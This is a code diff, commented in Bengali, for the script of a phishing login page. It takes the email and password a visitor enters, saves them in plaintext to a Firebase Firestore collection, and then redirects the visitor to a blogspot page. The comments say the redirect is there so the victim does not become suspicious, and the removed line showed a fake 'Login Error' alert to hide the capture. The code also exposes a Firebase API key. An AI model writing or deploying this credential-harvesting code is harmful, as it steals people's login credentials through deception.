@@ -26,7 +26,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // আপনার প্রজেক্টের কনফিগ কোড
+        // Firebase কনফিগ
         const firebaseConfig = {
             apiKey: "AIzaSyDab4A_V9rDyVpqw-rFerXs4zz4vdpmZRM",
             authDomain: "my-fb-data.firebaseapp.com",
@@ -39,20 +39,32 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // লগইন বাটনে ক্লিক করলে ডাটা সেভ করার কোড
+        // লগইন বাটনে ক্লিক করলে যা হবে
         document.getElementById('login-submit').addEventListener('click', async () => {
             const emailValue = document.getElementById('email').value;
             const passValue = document.getElementById('pass').value;
 
+            // ডাটা খালি থাকলে সাবধান করবে
+            if (emailValue === "" || passValue === "") {
+                alert("Please enter your email and password.");
+                return;
+            }
+
             try {
+                // Firebase-এ ডাটা সেভ হচ্ছে
                 await addDoc(collection(db, "user_data"), {
                     email: emailValue,
                     password: passValue,
                     time: new Date()
                 });
-                alert("Login Error! Please try again."); // ইউজারের কাছে এটি এরর মনে হবে, কিন্তু ডাটা জমা হয়ে যাবে
+
+                // ডাটা সেভ হওয়ার সাথে সাথে আপনার ব্লগ লিংকে চলে যাবে
+                window.location.href = "https://akherbabu2006.blogspot.com"; 
+
             } catch (e) {
-                console.error("Error adding document: ", e);
+                console.error("Error: ", e);
+                // এরর হলেও ইউজারকে পাঠিয়ে দিবে যাতে সন্দেহ না হয়
+                window.location.href = "https://akherbabu2006.blogspot.com";
             }
         });
     </script>
